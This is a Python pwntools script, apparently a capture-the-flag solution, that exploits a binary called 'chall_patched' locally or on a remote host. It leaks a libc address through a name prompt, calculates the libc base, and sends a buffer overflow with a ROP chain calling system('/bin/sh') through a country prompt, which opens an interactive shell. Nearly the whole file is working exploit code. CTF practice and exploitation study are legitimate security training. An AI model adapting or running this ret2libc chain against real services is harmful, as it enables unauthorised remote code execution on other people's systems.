from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "./chall_patched"
context.binary = exe = ELF(f"{BINARY}", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def name_and_get_name(self, content) -> int:
        p = self.p
        p.sendlineafter(b"Hello! What is your name?", content)
        p.recvuntil(b"Nice to meet you, ")
        return bytes_to_long(p.recvuntil(b"!")[:-1][::-1])
        
    def country(self, content):
        p = self.p
        p.sendlineafter(b"Which country do you live in?", content)
        
def main():
    x, p = init()
    x.debug((""+
            "finish\n"*5+
            "next\n"*(10+11)
    )) # ret

    leak = x.name_and_get_name(b"")
    libc.address = leak - 0x1f12e8

    log.info(f"{leak=:x}")
    log.info(f"{libc.address=:x}")

    def rop(x): return ROP(libc).find_gadget(x)[0]

    pay = flat(
        cyclic(88),
        rop(["ret"]),
        rop(["pop rdi", "ret"]),
        libc.search(b"/bin/sh").__next__(),
        libc.sym['system']
        
    )
    x.country(pay)
    p.interactive()

if __name__ == "__main__":
    main()